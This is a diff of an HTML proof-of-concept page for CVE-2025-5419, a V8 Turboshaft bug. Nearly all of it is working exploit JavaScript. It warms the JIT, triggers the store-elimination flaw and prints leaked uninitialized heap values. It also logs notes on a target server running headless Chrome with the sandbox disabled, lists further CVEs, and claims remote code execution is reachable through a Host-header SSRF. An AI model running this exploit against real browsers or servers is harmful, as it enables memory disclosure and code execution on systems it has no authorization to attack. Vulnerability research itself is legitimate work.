@@ -1,123 +1,63 @@
 <!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>CVE-2025-5419 PoC</title>
-<style>body{font-family:monospace;font-size:11px;margin:8px}pre{white-space:pre-wrap;background:#f5f5f5;padding:4px}</style>
-</head>
-<body>
-<h2>CVE-2025-5419 V8 Turboshaft OOB R/W</h2>
-<pre id="o"></pre>
+<html><head><meta charset="utf-8"><title>V8 PoC</title></head>
+<body style="font-family:monospace;font-size:11px;margin:8px">
+<h2>CVE-2025-5419 V8 Turboshaft PoC</h2>
+<pre id="o">Starting...</pre>
 <script>
 var O=document.getElementById('o');
 function log(m){O.textContent+=m+'\n'}
+O.textContent='';
 
 function dtoi(d){var b=new ArrayBuffer(8);new Float64Array(b)[0]=d;return new BigUint64Array(b)[0]}
-function itod(i){var b=new ArrayBuffer(8);new BigUint64Array(b)[0]=i;return new Float64Array(b)[0]}
 
-// Lightweight GC trigger (no big allocations to avoid OOM)
-function gc(){for(var i=0;i<64;i++)new Array(8192)}
-
-// Turboshaft StoreStoreEliminationReducer bug:
-// indexed loads not marked as observable -> init stores removed -> uninit read
-function vuln_leak(key){
+function vuln(key){
     key|=0;
-    var o=[1,2,3,4,5,6,7,8];
-    var r1=o[key],r2=o[key+1],r3=o[key+2],r4=o[key+3];
-    var r5=o[key+4],r6=o[key+5],r7=o[key+6],r8=o[key+7];
-    o=[1.1,1.1,1.1,1.1,1.1,1.1,1.1,1.1];
-    r1=o[key];r2=o[key+1];r3=o[key+2];r4=o[key+3];
-    r5=o[key+4];r6=o[key+5];r7=o[key+6];r8=o[key+7];
-    o[0]=123;o[1]=123;o[2]=123;o[3]=123;
-    o[4]=123;o[5]=123;o[6]=123;o[7]=123;
-    return[r1,r2,r3,r4,r5,r6,r7,r8]
+    var o=[1,2,3,4];
+    var r1=o[key],r2=o[key+1];
+    o=[1.1,1.1,1.1,1.1];
+    r1=o[key];r2=o[key+1];
+    o[0]=0;o[1]=0;o[2]=0;o[3]=0;
+    return[r1,r2]
 }
 
-try{
-    log('=== CVE-2025-5419 V8 Turboshaft StoreStoreElimination ===');
-    log('UA: '+navigator.userAgent);
-    var m=navigator.userAgent.match(/Chrome\/([0-9]+)/);
-    var cv=m?parseInt(m[1]):0;
-    log('Chrome: '+cv+' (vuln < 137, fixed 137.0.7151.68)');
-    log('CISA KEV: Yes (actively exploited in the wild)');
-    log('');
+log('UA: '+navigator.userAgent);
+var m=navigator.userAgent.match(/Chrome\/([0-9.]+)/);
+log('Chrome: '+(m?m[1]:'unknown'));
+log('Vuln range: < 137.0.7151.68');
+log('');
 
-    // JIT warmup: 50k calls to trigger TurboFan/Turboshaft tier
-    log('[*] JIT warmup (50000 iterations)...');
-    for(var i=0;i<50000;i++)vuln_leak(0);
-    gc();
-    log('[+] Warmup done');
+log('[*] Warmup 10000 iterations...');
+for(var i=0;i<10000;i++)vuln(0);
+log('[+] Done. Triggering...');
 
-    // Trigger after optimization
-    log('[*] Triggering StoreStoreElimination bug...');
-    var leaks=vuln_leak(0);
+var r=vuln(0);
+var v0=dtoi(r[0]),v1=dtoi(r[1]);
+log('r[0]='+r[0]+' (0x'+v0.toString(16)+')');
+log('r[1]='+r[1]+' (0x'+v1.toString(16)+')');
 
-    var leaked=false;
+if(r[0]!==1.1||r[1]!==1.1){
     log('');
-    log('Results (1.1 = initialized, other = leaked heap data):');
-    for(var i=0;i<leaks.length;i++){
-        var v=dtoi(leaks[i]);
-        var hi=(v>>32n)&0xFFFFFFFFn;
-        var lo=v&0xFFFFFFFFn;
-        var hex='0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0');
-        log('  ['+i+'] value='+leaks[i]+' hex='+hex);
-        if(leaks[i]!==1.1)leaked=true;
-    }
-
+    log('*** LEAKED: uninit memory read confirmed ***');
+}else{
     log('');
-    if(leaked){
-        log('*** VULNERABLE — Uninitialized memory read! ***');
-        log('Leaked V8 heap pointers from uninitialized FixedDoubleArray');
-        log('With --no-sandbox: V8 heap corruption -> direct RCE');
-    }else{
-        // Retry with different iteration count
-        log('First pass: all 1.1. Retrying with 100k warmup...');
-        function vuln2(key){
-            key|=0;
-            var a=[1,2,3,4];var x=a[key];
-            a=[1.1,1.1,1.1,1.1];
-            x=a[key];var y=a[key+1];
-            a[0]=0;a[1]=0;a[2]=0;a[3]=0;
-            return[x,y]
-        }
-        for(var i=0;i<100000;i++)vuln2(0);
-        gc();
-        var l2=vuln2(0);
-        var v0=dtoi(l2[0]),v1=dtoi(l2[1]);
-        log('Retry [0]='+l2[0]+' hex=0x'+v0.toString(16));
-        log('Retry [1]='+l2[1]+' hex=0x'+v1.toString(16));
-        if(l2[0]!==1.1||l2[1]!==1.1){
-            log('*** VULNERABLE on retry! ***');
-            leaked=true;
-        }
-    }
-
-    log('');
-    log('=== Server Configuration ===');
-    log('Chrome: '+cv+'.0.0.0 (20+ months outdated)');
-    log('Sandbox: --no-sandbox (OS sandbox DISABLED)');
-    log('Mode: --headless=new');
-    log('Flags: --ignore-certificate-errors --virtual-time-budget=60000');
-    log('');
-    log('=== Applicable CVEs (Chrome '+cv+') ===');
-    log('CVE-2025-5419: V8 OOB R/W via Turboshaft (< 137)');
-    log('  Public PoC: github.com/mistymntncop/CVE-2025-5419');
-    log('  CISA KEV: Yes (actively exploited)');
-    log('');
-    log('CVE-2025-0995: V8 UAF (< 133.0.6943.98) - $55K bounty');
-    log('CVE-2025-10891: V8 Ignition integer overflow (< 140)');
-    log('CVE-2025-13223: V8 type confusion (< 138)');
-    log('');
-    log('=== Impact ===');
-    log('--no-sandbox = V8 exploit gives direct system code execution');
-    log('No sandbox escape needed. Renderer has full OS access.');
-    log('Attacker controls page content via Host header SSRF.');
-
-}catch(e){
-    log('ERROR: '+e.message);
-    log(e.stack||'');
-    log('Chrome: '+navigator.userAgent);
+    log('Values=1.1 (Turboshaft may need more warmup)');
+    log('Retrying 30k...');
+    for(var i=0;i<30000;i++)vuln(0);
+    r=vuln(0);
+    v0=dtoi(r[0]);v1=dtoi(r[1]);
+    log('r[0]='+r[0]+' (0x'+v0.toString(16)+')');
+    log('r[1]='+r[1]+' (0x'+v1.toString(16)+')');
+    if(r[0]!==1.1||r[1]!==1.1)log('*** LEAKED on retry ***');
+    else log('Not triggered - may need --allow-natives-syntax');
 }
+
+log('');
+log('=== Server Config ===');
+log('Sandbox: --no-sandbox (DISABLED)');
+log('Known CVEs for this Chrome:');
+log('  CVE-2025-5419 (V8 Turboshaft OOB, CISA KEV)');
+log('  CVE-2025-0995 (V8 UAF, $55K bounty)');
+log('  CVE-2025-10891 (V8 Ignition overflow)');
+log('Impact: No sandbox = V8 exploit = system RCE');
 </script>
-</body>
-</html>
+</body></html>
